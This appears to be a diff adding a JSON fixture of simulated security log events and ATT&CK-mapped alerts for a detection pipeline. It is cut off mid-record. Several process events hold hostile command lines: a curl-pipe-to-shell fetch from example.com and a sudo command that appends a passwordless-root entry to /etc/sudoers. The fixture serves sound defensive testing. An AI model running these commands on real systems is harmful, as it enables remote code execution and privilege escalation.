@@ -1,0 +1,4482 @@
+[
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:05:00.000Z",
+    "event": {
+      "id": "evt-0000000000000001",
+      "kind": "event",
+      "dataset": "hostlog.auth",
+      "created": "2026-01-13T12:05:00.000Z",
+      "ingested": "2026-01-13T12:05:01.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "authentication"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "user_login",
+      "outcome": "success"
+    },
+    "host": {
+      "id": "h-0000000000000001",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "attacker01 logged in from 203.0.113.1",
+    "user": {
+      "name": "attacker01",
+      "id": "u-0000000000000fa1"
+    },
+    "source": {
+      "ip": "203.0.113.1"
+    },
+    "session": {
+      "id": "sess-00000000000003e9"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:05:10.000Z",
+    "event": {
+      "id": "evt-0000000000000002",
+      "kind": "event",
+      "dataset": "hostlog.process",
+      "created": "2026-01-13T12:05:10.000Z",
+      "ingested": "2026-01-13T12:05:11.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "process_start"
+    },
+    "host": {
+      "id": "h-0000000000000001",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Process start: /usr/bin/bash",
+    "process": {
+      "pid": 4201,
+      "executable": "/usr/bin/bash",
+      "entity_id": "p-00000000000007d1",
+      "start": "2026-01-13T12:05:10.000Z",
+      "command_line": "/usr/bin/bash -c 'curl -s http://example.com/payload.sh | sh'",
+      "name": "bash"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:05:15.000Z",
+    "event": {
+      "id": "evt-0000000000000003",
+      "kind": "event",
+      "dataset": "hostbehavior.file",
+      "created": "2026-01-13T12:05:15.000Z",
+      "ingested": "2026-01-13T12:05:16.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "file"
+      ],
+      "action": "file_write"
+    },
+    "host": {
+      "id": "h-0000000000000001",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "wrote /tmp/payload_1.sh",
+    "file": {
+      "path": "/tmp/payload_1.sh"
+    },
+    "process": {
+      "entity_id": "p-00000000000007d1"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:05:20.000Z",
+    "event": {
+      "id": "evt-0000000000000004",
+      "kind": "event",
+      "dataset": "hostlog.process",
+      "created": "2026-01-13T12:05:20.000Z",
+      "ingested": "2026-01-13T12:05:21.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "process_start"
+    },
+    "host": {
+      "id": "h-0000000000000001",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Process start: /usr/bin/sudo",
+    "process": {
+      "pid": 5201,
+      "executable": "/usr/bin/sudo",
+      "entity_id": "p-0000000000000bb9",
+      "start": "2026-01-13T12:05:20.000Z",
+      "command_line": "/usr/bin/sudo -n /usr/bin/bash -c 'echo attacker ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers'",
+      "name": "sudo",
+      "parent": {
+        "entity_id": "p-00000000000007d1",
+        "pid": 4201,
+        "executable": "/usr/bin/bash",
+        "name": "bash"
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:05:22.000Z",
+    "event": {
+      "id": "evt-0000000000000005",
+      "kind": "event",
+      "dataset": "hostbehavior.file",
+      "created": "2026-01-13T12:05:22.000Z",
+      "ingested": "2026-01-13T12:05:23.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "file"
+      ],
+      "action": "file_write"
+    },
+    "host": {
+      "id": "h-0000000000000001",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "modified /etc/sudoers",
+    "file": {
+      "path": "/etc/sudoers"
+    },
+    "process": {
+      "entity_id": "p-0000000000000bb9"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:05:30.000Z",
+    "event": {
+      "id": "evt-0000000000000006",
+      "kind": "event",
+      "dataset": "netflow.dns",
+      "created": "2026-01-13T12:05:30.000Z",
+      "ingested": "2026-01-13T12:05:31.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "network"
+      ],
+      "type": [
+        "protocol"
+      ],
+      "action": "dns_query"
+    },
+    "host": {
+      "id": "h-0000000000000001",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "DNS query c2-1.example.com",
+    "source": {
+      "ip": "10.0.0.10"
+    },
+    "destination": {
+      "ip": "8.8.8.8"
+    },
+    "network": {
+      "transport": "udp",
+      "protocol": "dns"
+    },
+    "dns": {
+      "question": {
+        "name": "c2-1.example.com"
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:05:40.000Z",
+    "event": {
+      "id": "evt-0000000000000007",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:05:40.000Z",
+      "ingested": "2026-01-13T12:05:41.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 70
+    },
+    "host": {
+      "id": "h-0000000000000001",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Initial Access detected via remote login",
+    "rule": {
+      "id": "rule-ia-01",
+      "name": "Suspicious Remote Login"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0001",
+        "name": "Initial Access"
+      },
+      "technique": {
+        "id": "T1078",
+        "name": "Valid Accounts"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco",
+          "suricata"
+        ],
+        "fingerprint": "fp-ia-0000000000001389"
+      },
+      "confidence": 0.82,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000001"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:05:50.000Z",
+    "event": {
+      "id": "evt-0000000000000008",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:05:50.000Z",
+      "ingested": "2026-01-13T12:05:51.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 75
+    },
+    "host": {
+      "id": "h-0000000000000001",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Execution detected via suspicious shell command",
+    "rule": {
+      "id": "rule-ex-01",
+      "name": "Suspicious Script Execution"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0002",
+        "name": "Execution"
+      },
+      "technique": {
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco",
+          "filebeat_sigma"
+        ],
+        "fingerprint": "fp-ex-0000000000001771"
+      },
+      "confidence": 0.77,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000002",
+          "evt-0000000000000003"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:06:00.000Z",
+    "event": {
+      "id": "evt-0000000000000009",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:06:00.000Z",
+      "ingested": "2026-01-13T12:06:01.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 85
+    },
+    "host": {
+      "id": "h-0000000000000001",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Privilege escalation detected via sudoers modification",
+    "rule": {
+      "id": "rule-pe-01",
+      "name": "Sudoers Modification"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0004",
+        "name": "Privilege Escalation"
+      },
+      "technique": {
+        "id": "T1548",
+        "name": "Abuse Elevation Control Mechanism"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco"
+        ],
+        "fingerprint": "fp-pe-0000000000001b59"
+      },
+      "confidence": 0.9,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000004",
+          "evt-0000000000000005"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:06:10.000Z",
+    "event": {
+      "id": "evt-000000000000000a",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:06:10.000Z",
+      "ingested": "2026-01-13T12:06:11.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 65
+    },
+    "host": {
+      "id": "h-0000000000000001",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Command and Control detected via DNS beacon",
+    "rule": {
+      "id": "rule-c2-01",
+      "name": "Suspicious DNS Beacon"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0011",
+        "name": "Command and Control"
+      },
+      "technique": {
+        "id": "T1071",
+        "name": "Application Layer Protocol"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "suricata"
+        ],
+        "fingerprint": "fp-c2-0000000000001f41"
+      },
+      "confidence": 0.72,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000006"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:10:00.000Z",
+    "event": {
+      "id": "evt-000000000000000b",
+      "kind": "event",
+      "dataset": "hostlog.auth",
+      "created": "2026-01-13T12:10:00.000Z",
+      "ingested": "2026-01-13T12:10:01.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "authentication"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "user_login",
+      "outcome": "success"
+    },
+    "host": {
+      "id": "h-0000000000000002",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "attacker02 logged in from 203.0.113.2",
+    "user": {
+      "name": "attacker02",
+      "id": "u-0000000000000fa2"
+    },
+    "source": {
+      "ip": "203.0.113.2"
+    },
+    "session": {
+      "id": "sess-00000000000003ea"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:10:10.000Z",
+    "event": {
+      "id": "evt-000000000000000c",
+      "kind": "event",
+      "dataset": "hostlog.process",
+      "created": "2026-01-13T12:10:10.000Z",
+      "ingested": "2026-01-13T12:10:11.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "process_start"
+    },
+    "host": {
+      "id": "h-0000000000000002",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Process start: /usr/bin/bash",
+    "process": {
+      "pid": 4202,
+      "executable": "/usr/bin/bash",
+      "entity_id": "p-00000000000007d2",
+      "start": "2026-01-13T12:10:10.000Z",
+      "command_line": "/usr/bin/bash -c 'curl -s http://example.com/payload.sh | sh'",
+      "name": "bash"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:10:15.000Z",
+    "event": {
+      "id": "evt-000000000000000d",
+      "kind": "event",
+      "dataset": "hostbehavior.file",
+      "created": "2026-01-13T12:10:15.000Z",
+      "ingested": "2026-01-13T12:10:16.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "file"
+      ],
+      "action": "file_write"
+    },
+    "host": {
+      "id": "h-0000000000000002",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "wrote /tmp/payload_2.sh",
+    "file": {
+      "path": "/tmp/payload_2.sh"
+    },
+    "process": {
+      "entity_id": "p-00000000000007d2"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:10:20.000Z",
+    "event": {
+      "id": "evt-000000000000000e",
+      "kind": "event",
+      "dataset": "hostlog.process",
+      "created": "2026-01-13T12:10:20.000Z",
+      "ingested": "2026-01-13T12:10:21.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "process_start"
+    },
+    "host": {
+      "id": "h-0000000000000002",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Process start: /usr/bin/sudo",
+    "process": {
+      "pid": 5202,
+      "executable": "/usr/bin/sudo",
+      "entity_id": "p-0000000000000bba",
+      "start": "2026-01-13T12:10:20.000Z",
+      "command_line": "/usr/bin/sudo -n /usr/bin/bash -c 'echo attacker ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers'",
+      "name": "sudo",
+      "parent": {
+        "entity_id": "p-00000000000007d2",
+        "pid": 4202,
+        "executable": "/usr/bin/bash",
+        "name": "bash"
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:10:22.000Z",
+    "event": {
+      "id": "evt-000000000000000f",
+      "kind": "event",
+      "dataset": "hostbehavior.file",
+      "created": "2026-01-13T12:10:22.000Z",
+      "ingested": "2026-01-13T12:10:23.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "file"
+      ],
+      "action": "file_write"
+    },
+    "host": {
+      "id": "h-0000000000000002",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "modified /etc/sudoers",
+    "file": {
+      "path": "/etc/sudoers"
+    },
+    "process": {
+      "entity_id": "p-0000000000000bba"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:10:30.000Z",
+    "event": {
+      "id": "evt-0000000000000010",
+      "kind": "event",
+      "dataset": "netflow.dns",
+      "created": "2026-01-13T12:10:30.000Z",
+      "ingested": "2026-01-13T12:10:31.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "network"
+      ],
+      "type": [
+        "protocol"
+      ],
+      "action": "dns_query"
+    },
+    "host": {
+      "id": "h-0000000000000002",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "DNS query c2-2.example.com",
+    "source": {
+      "ip": "10.0.0.10"
+    },
+    "destination": {
+      "ip": "8.8.8.8"
+    },
+    "network": {
+      "transport": "udp",
+      "protocol": "dns"
+    },
+    "dns": {
+      "question": {
+        "name": "c2-2.example.com"
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:10:40.000Z",
+    "event": {
+      "id": "evt-0000000000000011",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:10:40.000Z",
+      "ingested": "2026-01-13T12:10:41.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 70
+    },
+    "host": {
+      "id": "h-0000000000000002",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Initial Access detected via remote login",
+    "rule": {
+      "id": "rule-ia-02",
+      "name": "Suspicious Remote Login"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0001",
+        "name": "Initial Access"
+      },
+      "technique": {
+        "id": "T1078",
+        "name": "Valid Accounts"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco",
+          "suricata"
+        ],
+        "fingerprint": "fp-ia-000000000000138a"
+      },
+      "confidence": 0.82,
+      "evidence": {
+        "event_ids": [
+          "evt-000000000000000b"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:10:50.000Z",
+    "event": {
+      "id": "evt-0000000000000012",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:10:50.000Z",
+      "ingested": "2026-01-13T12:10:51.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 75
+    },
+    "host": {
+      "id": "h-0000000000000002",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Execution detected via suspicious shell command",
+    "rule": {
+      "id": "rule-ex-02",
+      "name": "Suspicious Script Execution"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0002",
+        "name": "Execution"
+      },
+      "technique": {
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco",
+          "filebeat_sigma"
+        ],
+        "fingerprint": "fp-ex-0000000000001772"
+      },
+      "confidence": 0.77,
+      "evidence": {
+        "event_ids": [
+          "evt-000000000000000c",
+          "evt-000000000000000d"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:11:00.000Z",
+    "event": {
+      "id": "evt-0000000000000013",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:11:00.000Z",
+      "ingested": "2026-01-13T12:11:01.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 85
+    },
+    "host": {
+      "id": "h-0000000000000002",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Privilege escalation detected via sudoers modification",
+    "rule": {
+      "id": "rule-pe-02",
+      "name": "Sudoers Modification"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0004",
+        "name": "Privilege Escalation"
+      },
+      "technique": {
+        "id": "T1548",
+        "name": "Abuse Elevation Control Mechanism"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco"
+        ],
+        "fingerprint": "fp-pe-0000000000001b5a"
+      },
+      "confidence": 0.9,
+      "evidence": {
+        "event_ids": [
+          "evt-000000000000000e",
+          "evt-000000000000000f"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:11:10.000Z",
+    "event": {
+      "id": "evt-0000000000000014",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:11:10.000Z",
+      "ingested": "2026-01-13T12:11:11.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 65
+    },
+    "host": {
+      "id": "h-0000000000000002",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Command and Control detected via DNS beacon",
+    "rule": {
+      "id": "rule-c2-02",
+      "name": "Suspicious DNS Beacon"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0011",
+        "name": "Command and Control"
+      },
+      "technique": {
+        "id": "T1071",
+        "name": "Application Layer Protocol"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "suricata"
+        ],
+        "fingerprint": "fp-c2-0000000000001f42"
+      },
+      "confidence": 0.72,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000010"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:15:00.000Z",
+    "event": {
+      "id": "evt-0000000000000015",
+      "kind": "event",
+      "dataset": "hostlog.auth",
+      "created": "2026-01-13T12:15:00.000Z",
+      "ingested": "2026-01-13T12:15:01.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "authentication"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "user_login",
+      "outcome": "success"
+    },
+    "host": {
+      "id": "h-0000000000000003",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "attacker03 logged in from 203.0.113.3",
+    "user": {
+      "name": "attacker03",
+      "id": "u-0000000000000fa3"
+    },
+    "source": {
+      "ip": "203.0.113.3"
+    },
+    "session": {
+      "id": "sess-00000000000003eb"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:15:10.000Z",
+    "event": {
+      "id": "evt-0000000000000016",
+      "kind": "event",
+      "dataset": "hostlog.process",
+      "created": "2026-01-13T12:15:10.000Z",
+      "ingested": "2026-01-13T12:15:11.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "process_start"
+    },
+    "host": {
+      "id": "h-0000000000000003",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Process start: /usr/bin/bash",
+    "process": {
+      "pid": 4203,
+      "executable": "/usr/bin/bash",
+      "entity_id": "p-00000000000007d3",
+      "start": "2026-01-13T12:15:10.000Z",
+      "command_line": "/usr/bin/bash -c 'curl -s http://example.com/payload.sh | sh'",
+      "name": "bash"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:15:15.000Z",
+    "event": {
+      "id": "evt-0000000000000017",
+      "kind": "event",
+      "dataset": "hostbehavior.file",
+      "created": "2026-01-13T12:15:15.000Z",
+      "ingested": "2026-01-13T12:15:16.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "file"
+      ],
+      "action": "file_write"
+    },
+    "host": {
+      "id": "h-0000000000000003",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "wrote /tmp/payload_3.sh",
+    "file": {
+      "path": "/tmp/payload_3.sh"
+    },
+    "process": {
+      "entity_id": "p-00000000000007d3"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:15:20.000Z",
+    "event": {
+      "id": "evt-0000000000000018",
+      "kind": "event",
+      "dataset": "hostlog.process",
+      "created": "2026-01-13T12:15:20.000Z",
+      "ingested": "2026-01-13T12:15:21.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "process_start"
+    },
+    "host": {
+      "id": "h-0000000000000003",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Process start: /usr/bin/sudo",
+    "process": {
+      "pid": 5203,
+      "executable": "/usr/bin/sudo",
+      "entity_id": "p-0000000000000bbb",
+      "start": "2026-01-13T12:15:20.000Z",
+      "command_line": "/usr/bin/sudo -n /usr/bin/bash -c 'echo attacker ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers'",
+      "name": "sudo",
+      "parent": {
+        "entity_id": "p-00000000000007d3",
+        "pid": 4203,
+        "executable": "/usr/bin/bash",
+        "name": "bash"
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:15:22.000Z",
+    "event": {
+      "id": "evt-0000000000000019",
+      "kind": "event",
+      "dataset": "hostbehavior.file",
+      "created": "2026-01-13T12:15:22.000Z",
+      "ingested": "2026-01-13T12:15:23.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "file"
+      ],
+      "action": "file_write"
+    },
+    "host": {
+      "id": "h-0000000000000003",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "modified /etc/sudoers",
+    "file": {
+      "path": "/etc/sudoers"
+    },
+    "process": {
+      "entity_id": "p-0000000000000bbb"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:15:30.000Z",
+    "event": {
+      "id": "evt-000000000000001a",
+      "kind": "event",
+      "dataset": "netflow.dns",
+      "created": "2026-01-13T12:15:30.000Z",
+      "ingested": "2026-01-13T12:15:31.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "network"
+      ],
+      "type": [
+        "protocol"
+      ],
+      "action": "dns_query"
+    },
+    "host": {
+      "id": "h-0000000000000003",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "DNS query c2-3.example.com",
+    "source": {
+      "ip": "10.0.0.10"
+    },
+    "destination": {
+      "ip": "8.8.8.8"
+    },
+    "network": {
+      "transport": "udp",
+      "protocol": "dns"
+    },
+    "dns": {
+      "question": {
+        "name": "c2-3.example.com"
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:15:40.000Z",
+    "event": {
+      "id": "evt-000000000000001b",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:15:40.000Z",
+      "ingested": "2026-01-13T12:15:41.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 70
+    },
+    "host": {
+      "id": "h-0000000000000003",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Initial Access detected via remote login",
+    "rule": {
+      "id": "rule-ia-03",
+      "name": "Suspicious Remote Login"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0001",
+        "name": "Initial Access"
+      },
+      "technique": {
+        "id": "T1078",
+        "name": "Valid Accounts"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco",
+          "suricata"
+        ],
+        "fingerprint": "fp-ia-000000000000138b"
+      },
+      "confidence": 0.82,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000015"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:15:50.000Z",
+    "event": {
+      "id": "evt-000000000000001c",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:15:50.000Z",
+      "ingested": "2026-01-13T12:15:51.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 75
+    },
+    "host": {
+      "id": "h-0000000000000003",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Execution detected via suspicious shell command",
+    "rule": {
+      "id": "rule-ex-03",
+      "name": "Suspicious Script Execution"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0002",
+        "name": "Execution"
+      },
+      "technique": {
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco",
+          "filebeat_sigma"
+        ],
+        "fingerprint": "fp-ex-0000000000001773"
+      },
+      "confidence": 0.77,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000016",
+          "evt-0000000000000017"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:16:00.000Z",
+    "event": {
+      "id": "evt-000000000000001d",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:16:00.000Z",
+      "ingested": "2026-01-13T12:16:01.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 85
+    },
+    "host": {
+      "id": "h-0000000000000003",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Privilege escalation detected via sudoers modification",
+    "rule": {
+      "id": "rule-pe-03",
+      "name": "Sudoers Modification"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0004",
+        "name": "Privilege Escalation"
+      },
+      "technique": {
+        "id": "T1548",
+        "name": "Abuse Elevation Control Mechanism"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco"
+        ],
+        "fingerprint": "fp-pe-0000000000001b5b"
+      },
+      "confidence": 0.9,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000018",
+          "evt-0000000000000019"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:16:10.000Z",
+    "event": {
+      "id": "evt-000000000000001e",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:16:10.000Z",
+      "ingested": "2026-01-13T12:16:11.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 65
+    },
+    "host": {
+      "id": "h-0000000000000003",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Command and Control detected via DNS beacon",
+    "rule": {
+      "id": "rule-c2-03",
+      "name": "Suspicious DNS Beacon"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0011",
+        "name": "Command and Control"
+      },
+      "technique": {
+        "id": "T1071",
+        "name": "Application Layer Protocol"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "suricata"
+        ],
+        "fingerprint": "fp-c2-0000000000001f43"
+      },
+      "confidence": 0.72,
+      "evidence": {
+        "event_ids": [
+          "evt-000000000000001a"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:20:00.000Z",
+    "event": {
+      "id": "evt-000000000000001f",
+      "kind": "event",
+      "dataset": "hostlog.auth",
